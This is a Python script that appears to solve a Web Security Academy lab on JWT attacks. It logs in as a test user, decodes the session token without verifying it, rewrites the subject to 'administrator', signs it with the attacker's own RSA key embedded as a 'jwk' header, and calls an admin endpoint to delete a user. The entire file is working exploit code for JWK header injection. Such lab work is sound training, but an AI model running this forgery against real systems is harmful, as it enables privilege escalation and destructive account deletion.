import requests as rq
import subprocess
from bs4 import BeautifulSoup
import jwt, json
import base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

def delete_carlos(modified_token):
    cookies = {"session": modified_token}
    delete_url = f"{BASE}/admin/delete?username=carlos"

    r = rq.get(delete_url, cookies=cookies)

    if r.status_code == 200:
        print("[+] Done!")
    else:
        print(f"[-] Failed: {r.status_code}")

BASE = "https://0a1f000403526025852da3d000d500ae.web-security-academy.net/"
LOGIN = f"{BASE}/login"

s = rq.Session()

r = s.get(LOGIN)
soup = BeautifulSoup(r.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

resp = s.post(LOGIN, data={
    "csrf": csrf,
    "username": "wiener",
    "password": "peter"
})

print("[+] Status:", resp.status_code)

jwt_token = s.cookies.get("session")

decode_token = jwt.decode(jwt_token, options={"verify_signature": False})
print(f"[+] Decode token: {decode_token}\n")

decode_header = jwt.get_unverified_header(jwt_token)
algorithm = decode_header["alg"]
with open('public_key.pem', 'rb') as file:
    public_key = serialization.load_pem_public_key(
        file.read(),
        backend=default_backend()
    )


decode_token['sub'] = 'administrator'
print(f"[+] Modifield token: {decode_token}")

with open('private_key.pem', 'rb') as file:
    private_key = serialization.load_pem_private_key(
        file.read(),
        password=None,
        backend=default_backend()
    )

public_key = private_key.public_key()
public_number = public_key.public_numbers()

def b64url_uint(val: int) -> str:
    return base64.urlsafe_b64encode(
        val.to_bytes((val.bit_length() + 7) // 8, "big")
    ).rstrip(b"=").decode("utf-8")

jwk = {
    "kty": "RSA",
    "e": b64url_uint(public_number.e),
    "n": b64url_uint(public_number.n),
    "kid": decode_header['kid'] 
}

print(json.dumps(jwk, indent=2))


modified_token = jwt.encode(decode_token, private_key, algorithm=algorithm, headers={'jwk' : jwk, 'kid' : decode_header['kid']})

print(f"[+] Final token: {modified_token}")

delete_carlos(modified_token)